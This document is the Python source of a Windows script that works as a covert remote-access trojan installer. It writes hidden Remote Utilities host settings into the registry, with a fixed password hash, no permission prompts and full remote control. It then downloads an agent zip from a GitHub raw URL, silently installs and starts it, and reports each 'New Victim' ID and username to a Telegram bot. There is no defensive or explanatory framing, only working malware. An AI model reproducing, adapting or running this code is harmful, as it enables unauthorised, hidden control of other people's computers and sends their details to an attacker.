# -*- coding: utf-8 -*- 
import os
import sys
import getpass
import ctypes
import requests
from subprocess import Popen,PIPE
from random import randint
from _winreg import *
import time
from zipfile import ZipFile
class SSH():
	def __init__(self):

		self.token = sys.argv[1]
		self.chat_id = sys.argv[2]
		self.agent =  "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/Agent.zip"
		self.reg =    "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/WarZone.reg"
		self.python = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/python.exe"
		self.Main()

	def Main(self):
		if ctypes.windll.shell32.IsUserAnAdmin() == 1:
			id = self.Install_Registry_Key()
			self.Install_Agent()
			self.Execute()
			self.SendMessage("😈 New Victim %0A ❖ ID : " + id)
		else:
			self.SendMessage("✖️ Need Admin Permissions.")

	def Rand_Id(self):
		id = ""
		for i in range(0,4):
			id += str(randint(100,999))
			if i != 3:
				id += "-"
		return id

	def Install_Registry_Key(self):
		
		self.SendMessage("📌 Installing Registry Key...")
		id = self.Rand_Id()
		key = CreateKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Usoris\Remote Utilities Host\Host\Parameters")
		key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Usoris\Remote Utilities Host\Host\Parameters",0, KEY_ALL_ACCESS)
		InternetId = '\xef\xbb\xbf<?xml version="1.0" encoding="UTF-8"?>	<rms_internet_id_settings version="70020"><internet_id>' + id + '</internet_id><use_inet_connection>true</use_inet_connection><inet_server></inet_server><use_custom_inet_server>false</use_custom_inet_server><inet_id_port>5655</inet_id_port><use_inet_id_ipv6>false</use_inet_id_ipv6><inet_id_use_pin>false</inet_id_use_pin><inet_id_pin></inet_id_pin></rms_internet_id_settings>'.encode('utf-8')
		General = '\xef\xbb\xbf<?xml version="1.0" encoding="UTF-8"?>\r\n<general_settings version="70020"><port>5650</port><hide_tray_icon_popup_menu>true</hide_tray_icon_popup_menu><tray_menu_hide_stop>true</tray_menu_hide_stop><language>English</language><callback_auto_connect>true</callback_auto_connect><callback_connect_interval>60</callback_connect_interval><password_data></password_data><protect_callback_settings>false</protect_callback_settings><protect_inet_id_settings>false</protect_inet_id_settings><use_legacy_capture>false</use_legacy_capture><do_not_capture_rdp>false</do_not_capture_rdp><use_ip_v_6>true</use_ip_v_6><log_use>true</log_use><log_use_windows>false</log_use_windows><chat_client_settings></chat_client_settings><auth_key_string></auth_key_string><sid_id>44400.5305099769</sid_id><notify_show_panel>false</notify_show_panel><notify_change_tray_icon>true</notify_change_tray_icon><notify_ballon_hint>false</notify_ballon_hint><notify_play_sound>false</notify_play_sound><notify_panel_x>-1</notify_panel_x><notify_panel_y>-1</notify_panel_y><proxy_settings>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxwcm94eV9zZXR0aW5ncyB2ZXJzaW9uPSI3MDAyMCI+PHVzZV9wcm94eT5mYWxzZTwvdXNlX3Byb3h5Pjxwcm94eV90eXBlPjA8L3Byb3h5X3R5cGU+PGhvc3Q+PC9ob3N0Pjxwb3J0PjgwODA8L3BvcnQ+PG5lZWRfYXV0aD5mYWxzZTwvbmVlZF9hdXRoPjxudG1sX2F1dGg+ZmFsc2U8L250bWxfYXV0aD48dXNlcm5hbWU+PC91c2VybmFtZT48cGFzc3dvcmQ+PC9wYXNzd29yZD48ZG9tYWluPjwvZG9tYWluPjwvcHJveHlfc2V0dGluZ3M+DQo=</proxy_settings><additional></additional><disable_internet_id>false</disable_internet_id><safe_mode_set>false</safe_mode_set><show_id_notification>false</show_id_notification><show_id_notification_request>false</show_id_notification_request><integrate_firewall_at_startup>false</integrate_firewall_at_startup><clipboard_transfer_mode>0</clipboard_transfer_mode><close_session_idle>false</close_session_idle><close_session_idle_interval>60</close_session_idle_interval></general_settings>'
		Security = '\xef\xbb\xbf<?xml version="1.0" encoding="UTF-8"?>\r\n<security_settings version="70020"><windows_security></windows_security><single_password_hash>9CBCD030C244A66DA40F2D327BD96BC9FEA81F0A00985B229199A1BF8BD910838E7D7D4F8548AB027516B27AD37A7BA729973C3304E9953DC2F220B6D5F3252F</single_password_hash><my_user_access_list><user_access_list/></my_user_access_list><ip_filter_type>2</ip_filter_type><ip_black_list></ip_black_list><ip_white_list></ip_white_list><auth_kind>1</auth_kind><otp_enable>false</otp_enable><otp_private_key></otp_private_key><otp_qr_secret></otp_qr_secret><user_permissions_ask>false</user_permissions_ask><user_permissions_interval>10000</user_permissions_interval><user_permissions_allow_default>false</user_permissions_allow_default><user_permissions_only_if_user_logged_on>false</user_permissions_only_if_user_logged_on><disable_remote_control>false</disable_remote_control><disable_remote_screen>false</disable_remote_screen><disable_file_transfer>false</disable_file_transfer><disable_redirect>false</disable_redirect><disable_telnet>false</disable_telnet><disable_remote_execute>false</disable_remote_execute><disable_task_manager>false</disable_task_manager><disable_shutdown>false</disable_shutdown><disable_remote_upgrade>false</disable_remote_upgrade><disable_preview_capture>false</disable_preview_capture><disable_device_manager>false</disable_device_manager><disable_chat>false</disable_chat><disable_screen_record>false</disable_screen_record><disable_av_capture>false</disable_av_capture><disable_send_message>false</disable_send_message><disable_registry>false</disable_registry><disable_av_chat>false</disable_av_chat><disable_remote_settings>false</disable_remote_settings><disable_remote_printing>false</disable_remote_printing><disable_rdp>false</disable_rdp><custom_server_list>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzZXJ2ZXJfY29ubmVjdF9jb250ZXh0IHZlcnNpb249IjcwMDIwIj48cm1zX3NlcnZlcnMvPjwvc2VydmVyX2Nvbm5lY3RfY29udGV4dD4NCg==</custom_server_list><selected_custom_server_id></selected_custom_server_id><custom_server_access>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxybXNfYWNsIHZlcnNpb249IjcwMDIwIj48cm1zX2FjZXMvPjxlbmFibGVfaW5oZXJpdD50cnVlPC9lbmFibGVfaW5oZXJpdD48L3Jtc19hY2w+DQo=</custom_server_access></security_settings>'
		SetValueEx(key, "InternetId", 0, REG_BINARY, InternetId)
		SetValueEx(key, "General", 0, REG_BINARY, General)
		SetValueEx(key, "Security", 0, REG_BINARY, Security)

		self.SendMessage("✔ Registry Key Installed.")
		return id

	def Install_Agent(self):
		self.SendMessage("📌 Installing Agent...")
		req = requests.get(self.agent)
		
		filename = os.environ['TEMP'] + "\\Agent.zip"
		file = open(filename, "wb")
		file.write(req.content)
		file.close()
	
		file = ZipFile(filename , "r")
		file.extractall(os.environ["APPDATA"])

		self.SendMessage("✔ Installed Agent.")



	def Execute(self):
		os.system(r'"C:\Users\\' + os.environ.get("USERNAME") + r'\\AppData\Roaming\Remote Utilities Agent\rutserv.exe" /silentinstall')
		os.system(r'"C:\Users\\' + os.environ.get("USERNAME") + r'\\AppData\Roaming\Remote Utilities Agent\rutserv.exe" /start')
		
	def SendMessage(self,message):
		requests.get("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)

SSH()